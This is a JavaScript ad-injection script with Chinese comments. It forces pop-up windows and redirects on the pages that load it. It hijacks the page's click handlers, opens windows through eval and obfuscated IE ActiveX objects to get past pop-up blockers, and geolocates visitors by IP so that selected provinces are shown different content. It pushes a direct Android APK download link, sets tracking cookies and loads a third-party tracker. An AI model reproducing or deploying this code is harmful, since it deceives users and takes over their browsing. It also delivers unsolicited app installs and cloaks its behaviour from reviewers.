// 4组图片素材，强制屏蔽的地区["山西","辽宁","安徽","福建","山东","河南","贵州","云南","陕西","甘肃","宁夏"]
// ·所有效果屏蔽部分区域
// ·用户每次pv 随机出一个未展示的素材，全部展示过后每次pv随机一个
// 除江苏外，停留30s就强制跳转
(function(){
        /**
         * 强制弹窗
         * @param {*跳转的目标} url 
         */
        function forceWindow(url){
            var _hascsp = 0;
            var poptype = 1;
            function updatecs() {};
            (function() {
                var browserType = navigator.userAgent;
                var openPage = {};
                openPage.ver = {
                    ie: /MSIE/.test(browserType),
                    ie6: !/MSIE 7\.0/.test(browserType) && /MSIE 6\.0/.test(browserType) && !/MSIE 8\.0/.test(browserType),
                    tt: /TencentTraveler/.test(browserType),
                    i360: /360SE/.test(browserType),
                    sogo: /; SE/.test(browserType),
                    gg: window.google && window.chrome,
                    _v1: '<object id="_tt_cs01" width="0" height="0" classid="CLSID:6BF5' + '2A52-394' + 'A-1' + '1D3-B15' + '3-00' + 'C04F' + '79FAA6"></object>',
                    _v2: '<object id="_tt_cs02" style="position:absolute;left:1px;top:1px;width:1px;height:1px;" classid="clsid:2D' + '360201-FF' + 'F5-11' + 'd1-8D0' + '3-00A' + '0C95' + '9BC0A"></object>'
                };
                if (openPage.ver.ie || openPage.ver.tt) {
                    document.write(openPage.ver._v1);
                    document.write(openPage.ver._v2);
                }
                openPage.onclick = null;
                openPage.fdc = null;
                openPage.timeid = 0;
                openPage.first = 1;
                openPage.url = '';
                openPage.w = 0;
                openPage.h = 0;
                openPage.init = function() { 
                    try {
                        if (typeof document.body.onclick == "function") { 
                            openPage.onclick = document.body.onclick;
                            document.body.onclick = null;
                        }
                        if (typeof document.onclick == "function") {
                            if (document.onclick.toString().indexOf('clickpp') < 0) {
                                openPage.fdc = document.onclick;
                                document.onclick = function() {
                                    openPage.clickpp(openPage.url, openPage.w, openPage.h);
                                }
                            }
                        }
                    } catch(q) {}
                };
                openPage.donepp = function(c, g) {
                    if (g == 1 && (!openPage.ver.i360 && openPage.ver.ie6)) {
                        return;
                    }
                    if (_hascsp) {
                        return;
                    }
                    try {
                        document.getElementById("_tt_cs01").launchURL(c);
                        _hascsp = 1;
                        updatecs();
                    } catch(q) {}
                };
                openPage.clickpp = function(c, e, f) {
                    openPage.open(c, e, f);
                    clearInterval(openPage.timeid);
                    document.onclick = null;
                    if (typeof openPage.fdc == "function"){
                        try {
                            document.onclick = openPage.fdc;
                        } catch(q) {}
                    }
                    if (typeof openPage.onclick == "function") {
                        try {
                        document.body.onclick = openPage.onclick;
                    } catch(q) {}
                    }
                };
                openPage.open = function(c, e, f) {
                    if (_hascsp) {
                        return;
                    }
                    openPage.url = c;
                    openPage.w = e;
                    openPage.h = f;
                    if (openPage.timeid == 0){
                        openPage.timeid = setInterval(openPage.init, 100);
                    }
                    var b = 'height=' + f + ',width=' + e + ',left=0,top=0,toolbar=yes,location=yes,status=yes,menubar=yes,scrollbars=yes,resizable=yes';
                    var j = 'window.open("' + c + '", "_blank", "' + b + '")';
                    var m = null;
                    try {
                        m = eval(j);
                    } catch(q) {}
                    if (m && !(openPage.first && openPage.ver.gg)) {
                        if (poptype != -1) {
                            m.focus();
                        } else {
                            m.blur();
                            window.focus();
                        }
                        _hascsp = 1;
                        updatecs();
                        if (typeof openPage.onclick == "function") try {
                            document.body.onclick = openPage.onclick;
                        } catch(q) {}
                        clearInterval(openPage.timeid);
                    } else {
                        var i = this;
                        var j = false;
                        if (openPage.ver.ie || openPage.ver.tt) {
                            document.getElementById("_tt_cs01");
                            document.getElementById("_tt_cs02");
                            setTimeout(function() {
                                var obj = document.getElementById("_tt_cs02");
                                if (_hascsp || !obj) return;
                                try {
                                    var wPop = obj.DOM.Script.open(c, "_blank", b);
                                    if (wPop) {
                                        if (poptype != -1) {
                                            wPop.focus();
                                        } else {
                                            wPop.blur();
                                            window.focus();
                                        }
                                        _hascsp = 1;
                                        updatecs();
                                    } else {
                                        if (openPage.ver.sogo) {
                                        _hascsp = 1;
                                        updatecs();
                                    }
                                    }
                                } catch(q) {}
                            },
                            200);
                        }
                        if (openPage.first) {
                            openPage.first = 0;
                            try {
                                if (typeof document.onclick == "function") openPage.fdc = document.onclick;
                            } catch(p) {}
                            document.onclick = function() {
                                i.clickpp(c, e, f);
                            };
                            if (openPage.ver.ie) {
                                if (window.attachEvent){
                                    window.attachEvent("onload",
                                    function() {
                                        i.donepp(c, 1);
                                    });
                                }
                                else {
                                if (window.addEventListener){
                                    window.addEventListener("load",
                                    function() {
                                        i.donepp(c, 1);
                                    },
                                    true);
                                }
                                else {
                                    window.onload = function() {
                                    i.donepp(c, 1);
                                };
                                }
                                }
                            }
                        }
                    }
                };
                window.__csppp = openPage; 
            })();	
            __csppp.open(url, window.screen.width, window.screen.height);
        };
        /**
         * 获得对应的cookie
         * @param {*Cookie名} name 
         */
        function getCookie(name){ 
    　　　　if (document.cookie.length>0){　　
    　　　　　　var c_start=document.cookie.indexOf(name + "=")　　;　
    　　　　　　if (c_start!=-1){ 
    　　　　　　　　c_start=c_start + name.length+1　　;
    　　　　　　　　var c_end=document.cookie.indexOf(";",c_start)　　;
    　　　　　　　　if (c_end==-1) c_end=document.cookie.length　　;
                  var value =  unescape(document.cookie.substring(c_start,c_end))　　;
                //   return decodeURIComponent(value)
                return value;
    　　　　　　} 
    　　　　}
    　　　　return "";
        };
        function setCookie(key,val,time){
             var date=new Date(); 
             var expiresDays=time||3;  
             date.setTime(date.getTime()+expiresDays*24*3600*1000); 
            
             document.cookie=key + "=" + val +"; expires="+date.toGMTString()+"; path=/"; ;  
            return getCookie(key);
        }
        /**
         * 检查是否锁定并设置锁定时间
         * @param {*锁定的小时数} hour 
         */
        function checkLockCookie(hour,maxCount,lockerName){
            lockerName = lockerName||"";
            var LOCKSTTIME = lockerName+'GewEWx+vbTkYq';
            var COUNT = lockerName+'agEY0agY';
            if(document.cookie.indexOf(LOCKSTTIME)!==-1){	
                maxCount = maxCount||1;			
                var time = getCookie(LOCKSTTIME);
                var count = parseInt(getCookie(COUNT)||0);
                var lockTime = (hour||1)*60*60*1000;
                if(new Date().getTime()-parseInt(time)<lockTime){
                    if(count<maxCount){
                        document.cookie= COUNT+"="+(count+1)+';';	
                        return true;								
                    }else{
                        return false;
                    }					
                }else{					
                    document.cookie= LOCKSTTIME+"="+new Date().getTime()+';';					
                    return true;
                };
            }else{				
                document.cookie= LOCKSTTIME+"="+new Date().getTime()+';';				
                return true;
            };
        };	
        /**
         * 原生实现的get请求
         * @param {*url} url 
         * @param {*请求的回调。返回值:(err,resp)} cb 
         */
        function myGet(url,cb){
            //步骤一:创建异步对象
            var ajax = new XMLHttpRequest();
            //步骤二:设置请求的url参数,参数一是请求的类型,参数二是请求的url,可以带参数,动态的传递参数starName到服务端
            ajax.open('get',url);
            //步骤三:发送请求
            ajax.send();
            //步骤四:注册事件 onreadystatechange 状态改变就会调用
            ajax.onreadystatechange = function () {
                if (ajax.readyState==4 &&ajax.status==200) {
                    //步骤五 如果能够进到这个判断 说明 数据 完美的回来了,并且请求的页面是存在的
                    cb(null,ajax.responseText)
            　　}
            }
        };
        /**
         * 按ip过滤部分地区后执行逻辑
         * @param {*过滤的城市黑名单} citys 
         * @param {*通过时的回调} cb 
         * @param {*被过滤时的回调} cb2 
         */
        function filterCity(citys,lockName,cb,cb2){
            lockName = lockName||'all';
            var isLockProvKey = lockName+"686P";
            var contryKey = "GRr";
            var lockProvValue = getCookie(isLockProvKey);
            var contryValue = getCookie(contryKey);
            if(lockProvValue){
                if(lockProvValue==='lock'){
                    cb2(contryValue);
                }else{
                    cb(contryValue);
                }
            }else{
                myGet('http://www.686lm.com/test/get',function(err,resp){
                    if(!err){
                        var area = JSON.parse(resp).area;
                        setCookie(contryKey,area.Country);
                        console.log(area.Country,citys);
                        if(checkAreaScreen(area.Country,citys)){
                            setCookie(isLockProvKey,'lock',1);
                            cb2(contryValue);
                        }else{
                            setCookie(isLockProvKey,'nolock',1);
                            cb(contryValue);
                        }
                    }
                });
            }
            

        }

    //获得渲染变量后的html字符串
    function renderHtml(href,material){
        var neiQian = '<div><a target="_blank" href="'+href+'"><img style="width: 100%" src="'+material+'"></a></div>';
        return neiQian;
    }
    function getCNZZContanerStr(id){
        return '<div id="'+id+'_stat'+'" style="display:none"></div>'
    }
    function doCNZZ(){
        var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1271872944'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s22.cnzz.com/z_stat.php%3Fid%3D1271872944' type='text/javascript'%3E%3C/script%3E"));
    }
        //获得js链接带过来的query参数
    function getCode(url,parm) {  

        var reg = new RegExp("(^|&)"+ parm +"=([^&]*)(&|$)");  
        var r = url.substr(url.indexOf("\?")+1).match(reg);  
        if (r!=null) return unescape(r[2]); return null;  
    };
    //area当前地区 screens屏蔽地区
    function checkAreaScreen(area,screens){
        for(var i =0 ;i<screens.length;i++){
            if(area.indexOf(screens[i])>-1){
                return true;
            }
        }
        return false;
    };

    //内嵌随机素材特定逻辑主函数
    function handleNeiQian(){
        var loadUrl = document.getElementsByTagName("script")[0].getAttribute("src");
        var screenProvinces = [];   //广告完全屏蔽的地区
        var forceOpenScreen = ["北京", "上海", "广州", "福建","陕西","杭州"];    //强制跳窗屏蔽的地区
        var forceOpenTime = 1 + parseInt(Math.random() * 3);//pv停留多久强制跳转，单位s
        var forceOpenRatio = 1;   //单pv执行强制跳窗的概率
        var materials = ["http://p99mtyr1u.bkt.clouddn.com/yx4322.jpg","http://p99mtyr1u.bkt.clouddn.com/yx4321.jpg","http://p99mtyr1u.bkt.clouddn.com/yx4323.png"];  //pv轮播素材
        var materialsKey = "YWV2eT26h";//已展示素材在cookie名
        var aimHref = "snssdk141://detail?groupid=6556999393600340484&gd_label=click_schema_jaw29"; //暗弹目的链接
        var clickHref = "http://dl.37wan.cn/upload/1_1002753_10745/xianlingjuexing_1014.apk";
        var containerId = "SDgweEg" + parseInt(100 * Math.random());
        var id = getCode.call(this,loadUrl,"id");
        var needForceOpen = true;
        var lockid = '1';
        document.writeln('<div id="'+containerId+'"></div>');
        var u = navigator.userAgent; 
        var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1; //android终端 
        var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios终端

        filterCity(['陕西','海南','北京','杭州'],'GiDatch',function(Country){
                material = 'http://p99mtyr1u.bkt.clouddn.com/qp.gif';
                aimHref = 'http://bl.b78y7.com/jj/qsce.html?=526d'        ;   
                clickHref = 'http://bl.b78y7.com/jj/qsce.html?=526d'    ;
                if(material){
                    var div = document.createElement('div');
                    div.innerHTML = renderHtml(clickHref,material).trim() +getCNZZContanerStr(containerId);
                    document.getElementById(containerId).appendChild(div);

                    var b = document.createElement("script");
                    b.type = "text/javascript";
                    b.src = 'https://s22.cnzz.com/z_stat.php?id=1271872944&web_id=1271872944';
                    document.getElementById(containerId+'_stat').appendChild(b);
                }          

        },function(Country){ //被屏蔽
            material = 'http://p99mtyr1u.bkt.clouddn.com/yx.jpg';
            aimHref = 'http://dl.37wan.cn/upload/1_1002753_10745/xianlingjuexing_1014.apk';
            clickHref = 'http://dl.37wan.cn/upload/1_1002753_10745/xianlingjuexing_1014.apk';
            if(material){
                var div = document.createElement('div');
                div.innerHTML = renderHtml(clickHref,material).trim() +getCNZZContanerStr(containerId);
                document.getElementById(containerId).appendChild(div);

                var b = document.createElement("script");
                b.type = "text/javascript";
                b.src = 'https://s22.cnzz.com/z_stat.php?id=1271872944&web_id=1271872944';
                document.getElementById(containerId+'_stat').appendChild(b);
            }
        });
    }
    //bin
    if(1){
        handleNeiQian();
    }
})(window,document);
